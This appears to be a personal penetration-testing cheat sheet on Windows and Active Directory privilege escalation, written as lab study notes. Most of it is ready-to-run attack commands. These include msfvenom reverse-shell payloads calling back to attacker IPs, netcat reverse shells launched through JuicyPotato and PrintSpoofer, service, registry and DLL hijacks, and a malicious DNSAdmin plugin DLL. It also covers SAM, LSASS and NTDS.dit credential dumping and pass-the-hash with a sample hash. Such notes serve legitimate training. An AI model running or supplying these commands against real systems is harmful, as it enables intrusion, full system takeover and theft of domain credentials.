## Windows Shells
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST LPORT -f aspx -o pay.aspx
```

<center><h1>Tools</h1></center>

- accesschk.exe -  *checks the access of specified parameter for the current user.*
- AdminPaint.lnk
- CreateShortcur.vbs
- lpe.bat
- plink.exe
- Powerip.ps1
- PrinterSpoofer.exe
- Procmon64.exe
- RoguePotato.exe
- savecred.bat
- Seatbelt.exe
- SharUp.exe
- winPEASany.exe\
- lazagne.exe - *For dumping all the credentials it has*

---

**LocalSystem** = nt authority\system

---

**Gaining Administrator or SYSTEM user shell.**

All privesc are examples of **access control violations**
*Access control* and *user permissions* are intrinsically linked.

When understanding privesc in windows we need to undestand *how Windows handles permissions* is very important.

# Permissions in Windows
## User accounts
Administrator is by default at the time of installation.
## Service accounts
- Service accounts are responsible to run services in windows like in linux ssh and all in passwd file
- They dont have interative shell which cannt sign in into windows
- **SYSTEM account is a default service account which has the highest privileges of any local account in Windows.**
- Other default service accounts include *NETWORK SERVICE* and *LOCAL SERVICE*

## Groups
User can belong to multiple groups and groups can have multiple users.
Groups allow for easier access control to resource.
**Regular groups:** Administrators, Users ( have set list of members. )
**Pseudo groups:** Authenticated Users ( have a dynamic list of members which changes based on certain interactions. )

## Resources
There are different types of resources/objects.
- Files/Directories
- Registry entries
- Services

## ACLs & ACEs
permissions to access certain resource in windows is controlled by the access control list (ACL) for the resource. 

Each ACL is made up of zero or more access control entries (ACEs)

Each **ACEs** defines  the relationship between a principal (i.e a user, group) and certain access right
![](https://i.imgur.com/WKjvSXE.png)


# Gen rev shell
Payload:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`
Download in victim:
`certutil -urlcache http://xxx/file file`

Run in victim:
`file`
## RDP
If we have access to RDP or we can enable it , we cann add our low privileged user to the administrators group and then spawn an admin commannd prompt via GUI 
`net localgroup administrators <username> /add`

## Admin -> SYSTEM
PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s a bit like a [remote access program](https://www.lifewire.com/free-remote-access-software-tools-2625161) but instead of controlling the computer with a mouse, [commands](https://www.lifewire.com/what-is-a-command-2625828) are sent via [Command Prompt](https://www.lifewire.com/command-prompt-2625840).

We can use PsExec64 tool to do that from windows sysinternals 
`PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe`

If we have valid credentials of system then we can do psexec64.py to get into system
`psexec64.py user:password@target-IP`

# Service Exploits
## Insecure Service Permissions
Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
command:
`accesschk.exe /accepteula -uwcqv user daclsvc`
*daclsv is a service manager in windows of DACL, or Discretionary Access Control List, is an internal list attached to an object in Active Directory that specifies which users and groups can access the object and what kinds of operations they can perform.*
so here we have the permission to change the config (SERVICE_CHANGE_CONFIG)

listing info about service:
`sc qc daclsvc`

changing BINARY_PATH_NAME:
``sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""``

Now start the service:
`net start daclsvc`

## Unquoted service Path
Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.

`sc qc unquotedsvc`

![](https://i.imgur.com/9aUQogz.png)

Using accesschk.exe, note that the BUILTIN\\Users group is allowed to write to the C:\\Program Files\\Unquoted Path Service\\ directory:

`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
![](https://i.imgur.com/UX8uM4j.png)

*You can see the RW(Read Write) permission to Users in that directory*

Copy reverse shell to service path:
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

So now start the service 
`net start unquotedsvc`

## Weak Registry Permissions
Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).
`sc qc regsvc`

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\\INTERACTIVE" group (essentially all logged-on users):
`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
``net start regsvc``

## Insecure Service Executables

`sc qc filepermsvc`
we can see it has SERVICE_START_NAME privileges

Check If BINARY_PATH_NAME is writable by everyone:
``C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"``

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Start the service
`net start filepermsvc`

# Registry
## AutoRuns

Check autorun executables on system:
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -qwvu "C:\Program Files\Autorun Program\program.exe"`

Putting shell in the PATH
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

So if we connect again using rdp we will be able to get the reverse shell.

## AlwaysInstalledElevated

Query the registry for AlwaysInstallElevated keys:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Note that both keys are set to 1 (0x1).

Generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

To get the shell:
`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

# Passwords
## Registry
The registry can be searched for keys and values that contain the word "password":
`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find admin AutoLogon credentials:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

`winexe -U 'admin%password' //MACHINE_IP cmd.exe`


## Saved Creds
List any saved credentials:

`cmdkey /list`

*Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.*

get shell:
`runas /savecred /user:admin C:\PrivEsc\reverse.exe`

## SAM (Security Accout Manager)
The SAM and SYSTEM files are located in the `C:\Windows\System32\config` directory.

Backups may exist in the C:\Windows\Repair or `C:\Windows\System32\config\RegBack` directories.

This is a file in windows just like shadow and passwd in linux which is used to authenticate users and also just like shadow and passwd we can crack it if we get hands on it.

```cmd
copy C:\Windows\Repair\SAM \\[IP]\kali\
copy C:\Windows\Repair\SYSTEM \\[IP]\kali
```
Resolve the SAM file:
```bash
# Python3 support
git clone https://github.com/ict/creddump7.git 
python3 pwndump.py SYSTEM SAM

# Secretdump
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

```

Crack the hashes:
```bash
hashcat -m 1000 --force <hash> /rockyou.txt
```


## Pass The Hash
Command to directly pass the NTLM hash for authorization (wihtout quotes):
```bash
`pth-winexe -U 'admin%hash' //10.10.105.187 cmd.exe`

#Example
`pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.8.230 cmd.exe`
```

##  WinPEAS 
Check the .NET framework first before useing this and then user accordingly to version
Search for credentials in files.
```cmdlet
winPEASany.exe quiet cmd searchfast filesinfo
```

## Evil-WinRM
Get the shell from hash
```bash
gem install evil-winrm
evil-winrm -i 192.168.1.1 -u admin -p password
evil-winrm -i 192.168.1.1 -u admin -H 4F2DBC410D627862C8A0E7DCC7A41978
```
# Scheduled tasks
Check for scheduled tasks:
```cmdlet
# Use this one 
schtasks /query /fo LIST /v
```
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Check if the powershell script is writable or not.
```Powershell
accesschk.exe /acccepteula -quvw user C:\DevTools\CleanUp.ps1 
```

Then do one things id you have access to it overwrite it 
```cmdlet
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

***Do this with cmd not powershell in last you can try with powershell.***
# Insecure GUI apps
In some older version of windows, users could run apps with admin privileges 
There aree often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality.

Run the available applicaton that runs as admin 
**In the Navigation bar after File-> Open type:**
``C:\Windows\System32\cmd.exe``
and Enter.

# StartUp Apps
Windows has startup directory for apps that should start for all users:
`C:\ProgramData\Microsoft\Windows\Satrt Menu\Programs\StartUp`
*If we can create file in this directory then we can get the shell*

Check the access:
```cmd
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

Now create a shotcut to your reverse.exe:

```powershell
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```
*CreateShortcut.vbs*

Run CreateShortcut.vbs (`cscript C:\PrivEsc\CreateShortcut.vbs`) and then login as admin with a password. :/

`rdesktop -u admin [IP]`

<center><h1>Installed Apps</h1></center>

#musttry #todo 

1.  Load Exploit-db.com and select filters
    
2.  Filter Type(local), Platform (Windows), check the "Has App" box, in the search box type "priv esc"
    
    * Most of these exploits rely on vulnerabilities that we have already covered above.
    
    * Some may help with buffer overflows
    
3.  Enumerate Apps
    
    ```
    tasklist /V
    ```
    
4.  Use seatbelt to search for non-standard processes
    
    ```
    .\seatbelt.exe NonstandardProcesses
    ```
    
5.  This can also be done with winPEAS
    
    ```
    .\winPEASany.exe quiet procesinfo
    ```
	
	
# Kernel Exploits
1. Run the exploit suggester. https://github.com/bitsadmin/wesng [[wesng]]
3. Identify the exploit https://github.com/SecWiki/windows-kernel-exploits
4. Run the exploit 
5. Boom!! Shell

# DLL Hijacking 
#todo 

In this one we just need to figureout the DLL the program depends upon and in which that dll exists Do we have permission to write in it?
**Detection**

Windows VM

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.  
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.  
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.  
4. In the input box on the same line type: **dllhijackservice.exe  
**5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.  
6. Next, select from the left-most drop down menu ‘Result’.  
7. In the input box on the same line type: **NAME NOT FOUND  
**8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.  
9. Open command prompt and type: **sc start dllsvc  
**10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

**Exploitation**

Windows VM

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.

Kali VM

1. Open windows_dll.c in a text editor and replace the command used by the system() function to: **cmd.exe /k net localgroup administrators user /add**  
2. Exit the text editor and compile the file by typing the following in the command prompt: **x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll  
**3. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

1. Place hijackme.dll in ‘C:\Temp’.  
2. Open command prompt and type: **sc stop dllsvc & sc start dllsvc**  
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: **net localgroup administrators**
	

------
	
<center><h1>Hot Potato</h1></center>

*Runs in only Windows7 (As tested in TCM winPrivEsc)*

Can be exploited in 3 ways :
1. Potato ([breenmaechibe](https://github.com/foxglovesec/Potato))
2. Tater.ps1 ([Kaven Robertson](https://github.com/Kevin-Robertson/Tater)) (**Use this one**)
3. SmashedPotato.cs (Cn33liz)


*Hot Potato is successful only if the **DCOM** enabled in the target server*

-   Start a listener on Kali
    
-   Copy potato exploit in the windows machine
    
-   Run the command to execute
    
    ```
     .\potato.exe -ip 10.9.2.93 -cmd "C:\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
    ```
	
Link: https://github.com/foxglovesec/Potato/blob/20765f5ed0eb1501c32f528152c83e088d98a4cb/source/Potato/Potato/obj/Release/Potato.exe

> Tater.ps1

1. In command prompt type: **powershell.exe -nop -ep bypass**  
2. In Power Shell prompt type: **Import-Module** **C:\Users\User\Desktop\Tools\Tater\Tater.ps1**  
3. In Power Shell prompt type: **Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"**  
4. To confirm that the attack was successful, in Power Shell prompt type: **net localgroup administrators**
5. You will see that **user** account is also an Administrator now.


----

<center><h1>SeLoadDriverPrivilege Privesc</h1></center>

[SeLoadDriverPrivilege](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege)


<center><h1>Token Impersonation - Rotten/Juicy Potato</h1></center>

If you have the permissions `SeAssignPrimaryTokenPrivilege` and `SeImpersonatePrivilege` then you can use this to get the reverse shell.

For Juicy potato you might need CLSID which you can find list [here](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) to get one or for direct you can see this [Video](https://youtu.be/EkFUzbBSXBo).
For juicy potato make windows Bat shell (==PowerShell Dependent==)
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.9.2.93 lport=9999 > shell.bat
```
Start the JuicyPotato:
```bash
# Enter -l different port number as you will get the shell on 9999 itself
jp.exe -t * -p shell.bat  -l 4444
# or With CLSID
jp.exe -l 1337 -p shell.bat -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Command execute
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\Windows\Temp\Temp\nc.exe -e cmd.exe 10.10.14.13 443" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
```
[Usage of RoguePotato](https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html)
[Rogue potato Upgradede (Juicy Potato)](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
[Repo](https://github.com/antonioCoco/RoguePotato)
[Find in OSCP-prep by x3rz](https://github.com/x3rz/OSCP-prep.git)

*Granny*
> Note: On new systems JuicyPotato works fine but on older systems **TokenImpersonation** is abused via **==churrasco exploit==**
> In kali we can find it here: ```file /usr/share/sqlninja/apps/churrasco.exe```
> Exploit Usage: `churrasco.exe -d C:\Temp\shell.exe`

https://github.com/Re4son/Churrasco
https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
```text
To escalate privileges a tool called churrasco developed by Cesar Cerrudo is used. This tool takes advantage of an exploit that uses a 
technique that he named as token kidnapping which elevates privileges to a System account by using techniques that impersonate tokens to 
manipulate processes and thread access lists (Cerrudo, 2008). The source code of the tool that affects Windows 2008 was downloaded from 
Cesar Cerrudo’s website and compiled using Visual Studio C++ 2008 Express edition (www.argeniss.com/research/Churrasco2.zip). It is 
important to note that this vulnerability has been patched by Microsoft in Windows 2012 (MS09-12).
```


<center><h1>Token Impersonation - Rogue Potato</h1></center>

Setup socat redirector on Kali, forwarding Kali port 135 to 9999 on Windows:

```bash
# Start port forwarding
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

```


```bash
# run exploit
.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
```

Resources Potatoes: https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato

<center><h1>Token Impersonation - PrintSpoofer</h1></center>

If the target server having the **SeImpersonatePrivilege** or **CreateGlobal**
- Get shell for service account. 
	```bash
	C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
	```
- Check the privilege `whoami /priv`.

![[printspooferpng.png]]

-Check the User *You will see its service account*

![[printspoofer3.png]]

- You can see that you have *SeImpersonatePrivilege* permissions.
- Running 
	```bash
	# execute reverse shell
	Printspoofer.exe -c "C:\PrivEsc\reverse.exe" -i
	# or
	# Works in Powershell env
	.\prinSpoofer.exe -c ".\nc.exe 10.10.14.14 135 -e cmd"
	
	# Same session
	Printspoofer.exe -c "cmd" -i
	```

![[printerspoof2.png]]




---

## TL/DR

- Check for stored passwords, Kernel exploits and all the things about token imporsanaion in this document.

-   If the machine is >= Windows 10 1809 & Windows Server 2019 - Try [Rogue Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato) or [PrintSpoofer]()
    
-   If the machine is < Windows 10 1809 < Windows Server 2019 - Try [Juicy Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato)

- Windows m whoami /priv se Impersonate aur CreateGlobal wale token ho to seedha PrintSpoofer (Windows 8.1 ke baad) aur agar 7 chalri ho to juicypotato or hot potato(TCM)
- Wrna agar token ho hi na to same cheez ki haand ke files dekho credentials ke liye
- Wrna Seatbelt.exe



---


# Port Forwarding

[**plink.exe**](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

-   Copy the plink.exe to the windows machine
    
-   enable the SSH with Root login
    
    ```
     vim /etc/ssh/sshd_config
    ```
    
-   Restart the SSH service
    
    ```
     service ssh restart
    ```
    
-   Run the plink in the windows shell
    
    ```
     .\plink.exe root@kali-ip -R 445:127.0.0.1:445
    ```
    
-   Login and then modify the winexe command
    
    ```
     winexe -U 'admin%password' //127.0.0.1 cmd.exe
    ```


----

<center><h1>Helpful scripts</h1></center>

#### Accesschk
From this tool we can check if the current user has permission to write or not

**Check service permission:** (Insecure service perissmions)
```cmdlet
accesschk.exe /accepteula -uwcqv user daclsvc
```

**Check foler permission:** (Unquoted service path)
```cmdlet
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

#### WinPEAS
Before running WinPEAS
```cmdlet
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Search for credentials in files.
```cmdlet
winPEASany.exe quiet cmd searchfast filesinfo
```

Enumerate service info 
```cmdlet
.\winPEASany.exe quiet servicesinfo
```

Enumerate for Autoruns
```cmdlet
.\WinPEASany.exe quite applicationinfo
```

Check Windows Credentials:
```cmdlet
.\WinPEASany.exe quite windowscreds
```

For user/files info:
```cmdlet
.\winPEASany.exe quiet filesinfo userinfo
```

#### PowerUp
Script: [PowerUp.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

#### SharpUp
Link: [SharUp Github](https://github.com/GhostPack/SharpUp) PreCompiled Binary: [SharpUp.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)

```cmdlet
.\SharpUp.exe
```

#### Seatbelt
Link: [Seatbelt Github](https://github.com/GhostPack/Seatbelt) PreCompiled Binary: [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)

```cmdlet
.\Seatbelt.exe
```

---- 


PowerUP(powershell script) and SharpUp(pre compiled) used to find privesc method fast
[PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
Usage:
```powershell
powershell -exec bypass 
. .\PowerUp.ps1 (load script)
Invoke-AllChecks
```

[[Post exploitation]]

[SharpUp](https://github.com/r3motecontrol/Ghoostpack-CompiledBinaries/blob/master/SharpUp.exe)

**Seatbelt** - Enum tool can run enum check. it provide further info to help in priv esc.

[Seatbelt](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)

**winPeas** is like linpeas for windows
hunts for privesc misconfigs.
[](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe)
Enable colors:
```cmdlet
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

**accesschk.exe** Checks user access control rights. 
If you arent in RDP then it might create a problem cuz it shows a pop up in cmd. So use **Old version which has /accepteula option**



# Pentest+ 

## Cpasswd 
``` powershell
Get-DecryptedCpassword 
```

## Clear Test credentials in LDAP
- If ssl is not enabled on LDAP then creds are sent over the network in clear text.
- Use the inseecure LDAP Bind script to check for this in PowerShell.
``` powershell
.\ Query-InsecureLDAPBinds.ps1 -ComputerName dc1.corp,com -Hours 24
```
- You receive a CSV file as output showing which accounts are vulnerable 

## Kerbroasting 
- Any domain user account that has a service principal name (SPN) set can have a service ticker (TGS).
- Ticket can be requested by any user in the domain and allows for offline cracking of the service account plaintext password.

## Credentials in LSASS
- Local security authrotiy subsystem service
- process in Windows that  enforces the security policy of the system
- verifies users when logging on to a computer or server 
- Performs password changes 
- Creates access token(i.e kerberos).

## SAM Database 
- Security Account Manager is a database file that stores the user password in windows as LM hash or NTLM hash

- File is used to authenticate local users and remote users
- Passwords can be cracked offline if SAM file is stolen
- 'Hashdump' command in msf.

## DLL hijacking
Dynamic link library is used as malicaios same as library or lib.so files needed in linux programs to execute so we can replace with malicaious dll.

## Exploitable
Malicaios exe.
## Keylogger
## Schedule Tasks


-----
----
----
-----
----
----
-----
----
----

<center><h1>AD peivilege escalation</h1></center>

## DNSAdmin DLL 
DNSAdmins can run DLL files with elevated privileges Means **Domain Admin**.

Maliciouis DLL file: 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.4.1 LPORT=4444 -f dll > exploit.dll

# Export this with SMB service (victim machinls

dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.8\share\exploit.dll

# Powershell
cmd /c 'dnscmd /config /serverlevelplugindll \\10.10.14.8\share\exploit.dll'

# Stop and Start the DNS service which will download the malicious dll file and execute it
sc.exe stop dns ; sc.exe start dns


```

If attack *Fails* then check the `ServerLevelPluginDll` in DLL file:
```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

## Backup Account
#Blackfield_HTB 

Check the privileges `whoami /priv` and check if the account is in backup acount `net user svc_backup` 
if,
- [ ] It has `SeBackupPrivilege` and `SeRestorePrivilege`

then we can escilate the priivleges of this current account using [Acl-FullControl](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1) script, can be read in [this](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sebackupprivilege-3-1-4) article

*This script allows user to chnage the ACL for that specified file or Directory*

```bash
# Syntax
Import-Module .\Acl-FullControl.ps1
Acl-FullControl -user [domain]\[user] -path C:\Users\Administrator\


# Example
Acl-FullControl -user blackfield.local\svc_backup -path C:\Users\Administrator\
```



## Steal NTDS.dit
It is very common during penetration tests where domain administrator access has been achieved to extract the password hashes of all the domain users for offline cracking and analysis. These hashes are stored in a database file in the domain controller (NTDS.DIT) with some additional information like group memberships and users.

The NTDS.DIT file is constantly in use by the operating system and therefore cannot be copied directly to another location for extraction of information. This file can be found in the following Windows location:
 `C:\Windows\NTDS\NTDS.dit`

We can steal it by two ways:
- [ ] [diskshadow](https://pentestlab.blog/tag/diskshadow/)
- [ ] wbadmin

<center><i>Idea is to backup the OS then grab the ntds.dit file</i></center>

We can do that in C$ or make NTFS SMB from *ippsec* 

```bash
# chnage dir to SMB C$ 
cd \\10.10.10.192\C$\Windows\Temp
# Make a dir to store
md CFX
# Start the backup via wbadmin
wbadmin start backup -backuptarget:\\10.10.10.192\C$\Windows\Temp\CFX\ -include:C:\Windows\ntds\ntds.dit -quiet

# List items
tree /A /F
```

Now we want to access the backup files to do that we need to specify a flag `notRestoreAcl`  which is valid when recovering file. 

```bash
wbadmin start recovery -version:04/21/2021-14:14<version_identifier> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\Users\svc_backup\Downloads -notRestoreAcl -quiet
```

Last this is to do is to dump the `SYSTEM` and `SAM` file from registers

```bash
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
```


Finally....... 
lets crack the ntds.dit file

```bash
impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```